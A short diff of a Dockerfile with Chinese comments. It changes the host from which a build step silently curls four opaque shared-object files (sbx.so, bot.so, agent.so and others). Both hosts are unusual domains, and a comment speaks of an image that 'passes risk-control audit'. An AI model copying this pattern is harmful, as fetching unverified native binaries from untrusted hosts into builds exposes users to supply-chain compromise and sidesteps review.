@@ -8,10 +8,10 @@ RUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*
 
 # 提前把 main.py 运行依赖的动态链接库固化下来
 RUN mkdir -p .cache && \
-    curl -L -s -o .cache/sbx.so https://amd64.31888.xyz/sbx.so && \
-    curl -L -s -o .cache/bot.so https://amd64.31888.xyz/bot.so && \
-    curl -L -s -o .cache/v1.so https://amd64.31888.xyz/v1.so && \
-    curl -L -s -o .cache/agent.so https://amd64.31888.xyz/agent.so
+    curl -L -s -o .cache/sbx.so https://amd64.ssss.nyc.mn/sbx.so && \
+    curl -L -s -o .cache/bot.so https://amd64.ssss.nyc.mn/bot.so && \
+    curl -L -s -o .cache/v1.so https://amd64.ssss.nyc.mn/v1.so && \
+    curl -L -s -o .cache/agent.so https://amd64.ssss.nyc.mn/agent.so
 
 # ========================================================
 # 阶段二：组装你自主掌控的、通过风控审计的生产 Slim 镜像
